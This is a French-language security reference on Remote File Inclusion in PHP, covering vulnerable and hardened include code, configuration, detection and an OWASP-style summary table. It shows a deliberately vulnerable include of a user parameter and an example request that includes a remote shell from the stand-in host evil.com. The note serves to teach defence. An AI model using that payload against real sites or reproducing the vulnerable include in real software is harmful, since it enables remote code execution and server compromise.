### Description

Les failles d'inclusion de fichiers distants (RFI) se produisent lorsqu'une application web inclut des fichiers distants via une URL sans validation adéquate des entrées utilisateur. Cela permet à un attaquant d'injecter des scripts malveillants hébergés sur des serveurs externes, conduisant à la compromission du système, à la divulgation de données sensibles, et à d'autres conséquences graves.

---
### Exemple d'Attaque RFI

**Scénario d'attaque :**

- Une application web inclut dynamiquement un fichier basé sur les paramètres fournis par l'utilisateur via une URL, par exemple `https://example.com/index.php?page=home`.

**Exemple de code vulnérable :**

```php
<?php 
$page = $_GET['page']; 
include($page . ".php"); 
?>
```

**Exploitation :**

- Un attaquant peut manipuler le paramètre `page` pour inclure un fichier distant malveillant, par exemple `https://example.com/index.php?page=http://evil.com/shell`.

```http
GET /index.php?page=http://evil.com/shell HTTP/1.1 
Host: example.com
```

---
### Prévention des Attaques RFI

**Désactiver l'Inclusion de Fichiers Distants :**

- Désactiver l'option `allow_url_include` dans le fichier de configuration PHP (`php.ini`).

```ini
; Désactiver l'inclusion de fichiers distants 
allow_url_include = Off
```

**Validation et Sanitisation des Entrées :**

- Valider et assainir toutes les entrées utilisateur pour s'assurer qu'elles ne contiennent pas de caractères spéciaux ou d'URL.

```php
$whitelist = ['home', 'about', 'contact']; 
$page = $_GET['page']; 
if (!in_array($page, $whitelist)) { 
die("Page non autorisée."); 
} 
include($page . ".php");
```

**Utilisation de Chemins Absolus :**

- Utiliser des chemins absolus pour les fichiers inclus afin d'empêcher les manipulations de chemins relatifs ou d'URL.

```php
$page = basename($_GET['page']); 
include("/var/www/html/pages/" . $page . ".php");
```

---
### Détection des Failles RFI

**Revue de Code :**

- Examiner le code source pour identifier les inclusions de fichiers basées sur des entrées utilisateur sans validation adéquate.

**Tests Manuels :**

- Effectuer des tests manuels en manipulant les paramètres de requêtes pour inclure des fichiers distants et vérifier la présence de vulnérabilités.

**Utilisation d'Outils de Sécurité :**

- Utiliser des outils de sécurité tels que Burp Suite, OWASP ZAP, ou des scanners spécifiques pour détecter les failles RFI.

---
### Exemples de Prévention

**Validation stricte des Entrées :**

```php
$allowed_pages = ['home', 'about', 'contact']; 
$page = $_GET['page']; 
if (!in_array($page, $allowed_pages)) { 
die("Page non autorisée."); 
} 
include($page . ".php");
```

**Utilisation de Fonctions Sécurisées :**

```php
$page = filter_input(INPUT_GET, 'page', FILTER_SANITIZE_STRING); 
$allowed_pages = ['home', 'about', 'contact']; 
if (!in_array($page, $allowed_pages)) { 
die("Page non autorisée."); 
} 
include(__DIR__ . "/pages/" . $page . ".php");
```

**Contrôle des Chemins :**

```php
$page = realpath(__DIR__ . "/pages/" . $_GET['page'] . ".php"); 
$base_dir = realpath(__DIR__ . "/pages/"); 
if (strpos($page, $base_dir) !== 0 || !file_exists($page)) { 
die("Page non autorisée."); 
} 
include($page);
```

---

| Catégorie                    | Information                                                                                                                                                                                                                                                                                                             |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TTP**                      | Technique d'inclusion de fichier distant                                                                                                                                                                                                                                                                                |
| **CWE**                      | CWE-94 (Improper Control of Generation of Code ('Code Injection'))                                                                                                                                                                                                                                                      |
| **Description de l'attaque** | RFI permet à un attaquant d'inclure des fichiers distants, généralement des scripts, dans une application web. Cela se fait en exploitant des vulnérabilités dans les applications web qui ne valident pas correctement les entrées utilisateur utilisées pour inclure des fichiers.                                    |
| **Impacts potentiels**       | - Exécution de code malveillant à distance<br>- Compromission du serveur web<br>- Accès non autorisé aux données                                                                                                                                                                                                        |
| **Comment la détecter**      | - Surveillance des journaux de serveur web pour les URL externes suspectes<br>- Scans de sécurité et tests de pénétration<br>- Audits de code pour identifier les points d'entrée vulnérables                                                                                                                           |
| **Remédiations/mitigations** | - Validation stricte des entrées utilisateur<br>- Utilisation de la liste blanche pour les URL autorisées<br>- Configuration sécurisée des serveurs et des interpréteurs de scripts<br>- Désactivation des inclusions de fichiers distants dans la configuration du serveur (par exemple, `allow_url_include` dans PHP) |
| **Lien de référence**        | [OWASP - Remote File Inclusion](https://owasp.org/www-community/attacks/Remote_File_Inclusion)                                                                                                                                                                                                                          |

